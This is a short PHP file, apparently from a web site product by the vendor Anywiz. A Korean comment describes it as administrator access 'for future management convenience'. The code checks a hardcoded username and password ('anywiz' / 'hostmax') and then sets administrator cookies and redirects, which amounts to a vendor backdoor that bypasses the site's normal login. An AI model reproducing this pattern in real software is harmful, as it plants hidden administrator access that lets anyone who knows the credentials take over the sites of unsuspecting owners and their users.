<?

// 애니위즈 관리자 접속[추후 관리 편의를 위해]
if($admin_id == "anywiz" && $admin_pw == "hostmax"){
   
   setcookie("wiz_admin[id]", "anywiz", false, "/");
	setcookie("wiz_admin[name]", "애니위즈", false, "/");
	setcookie("wiz_admin[email]", "help@anywiz.info", false, "/");

   Header("Location: ./");
   
}

?>